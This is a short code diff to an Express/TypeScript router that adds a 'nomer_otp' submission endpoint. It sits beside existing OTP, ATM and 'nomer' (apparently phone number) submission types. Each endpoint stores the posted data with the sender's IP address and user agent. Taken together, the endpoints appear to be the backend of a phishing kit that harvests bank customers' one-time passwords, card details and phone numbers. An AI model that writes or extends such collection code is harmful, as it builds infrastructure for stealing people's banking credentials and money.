@@ -8,6 +8,7 @@ import {
   SubmitOtpBody,
   SubmitAtmBody,
   SubmitNomerBody,
+  SubmitNomerOtpBody,
 } from "@workspace/api-zod";
 
 const router: IRouter = Router();
@@ -123,6 +124,22 @@ router.post("/submissions/nomer", async (req, res): Promise<void> => {
   const row = await insertSubmission({
     sessionId: parsed.data.sessionId,
     type: "nomer",
+    data: JSON.stringify(parsed.data),
+    ipAddress: getClientIp(req),
+    userAgent: req.headers["user-agent"] ?? null,
+  });
+  res.status(201).json({ id: row.id, sessionId: row.sessionId });
+});
+
+router.post("/submissions/nomer_otp", async (req, res): Promise<void> => {
+  const parsed = SubmitNomerOtpBody.safeParse(req.body);
+  if (!parsed.success) {
+    res.status(400).json({ error: parsed.error.message });
+    return;
+  }
+  const row = await insertSubmission({
+    sessionId: parsed.data.sessionId,
+    type: "nomer_otp",
     data: JSON.stringify(parsed.data),
     ipAddress: getClientIp(req),
     userAgent: req.headers["user-agent"] ?? null,
